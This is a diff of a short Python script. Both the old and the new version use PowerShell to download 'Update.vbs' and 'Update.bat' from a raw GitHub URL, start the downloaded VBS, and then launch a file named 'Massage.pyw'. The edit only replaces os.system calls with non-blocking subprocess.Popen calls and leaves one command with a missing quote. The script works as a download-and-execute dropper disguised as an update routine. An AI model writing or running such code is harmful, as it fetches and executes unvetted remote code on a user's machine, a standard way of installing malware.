@@ -1,13 +1,11 @@
 import os
-import sys
-
-os.system("timeout /t 10")                                                          #-----------#
-os.system('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.vbs -OutFile Update.vbs"')
-os.system("timeout /t 5")
-os.system("del Update.bat")                                                         #-----------#
-os.system('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.bat -OutFile Update.bat"')
-os.system("timeout /t 5")
-os.system("start Update.vbs")
-os.system("timeout /t 5")
-os.system("timeout /t 300")
-os.system("Massage.pyw")
+import subprocess
+subprocess.Popen('timeout /t 10', shell=True)                                              #-----------#
+subprocess.Popen('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.vbs -OutFile Update.vbs"', shell=True)
+subprocess.Popen('del Update.bat', shell=True)                                             #-----------#
+subprocess.Popen('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Update.bat -OutFile Update.bat', shell=True)
+subprocess.Popen('timeout /t 5', shell=True)
+subprocess.Popen('start Update.vbs', shell=True)
+subprocess.Popen('timeout /t 5', shell=True)
+subprocess.Popen('timeout /t 300', shell=True)
+subprocess.Popen('Massage.pyw', shell=True)
